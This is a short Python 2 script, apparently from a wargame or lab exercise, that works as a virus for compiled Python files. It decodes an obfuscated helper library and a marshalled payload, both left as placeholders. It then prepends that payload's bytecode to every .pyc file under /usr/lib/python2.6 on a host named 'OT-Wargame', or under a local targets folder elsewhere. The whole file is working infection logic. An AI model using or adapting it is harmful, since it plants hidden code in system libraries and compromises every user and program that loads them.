import glob
import zlib
import base64
import marshal
import socket


Code = None
SetLineno = None

exec zlib.decompress(base64.b64decode("__BYTEPLAY_PLACEHOLDER__"))
payload = Code.from_code(marshal.loads(base64.b64decode("__PAYLOAD_PLACEHOLDER__")))


def infect(f_to_infect):
    f = open(f_to_infect, 'r')

    #Magic number and timestamp
    head = f.read(8)

    data = Code.from_code(marshal.loads(f.read()))

    f.close()

    data.code[:0] = payload.code

    newfile = open(f_to_infect, 'w')
    newfile.write(head)
    marshal.dump(data.to_code(), newfile)
    newfile.close()


if socket.gethostname() == "OT-Wargame":
    target_dir = "/usr/lib/python2.6/*.pyc"
else:
    target_dir = "./targets/*.pyc"

for i in glob.glob(target_dir):
    infect(i)
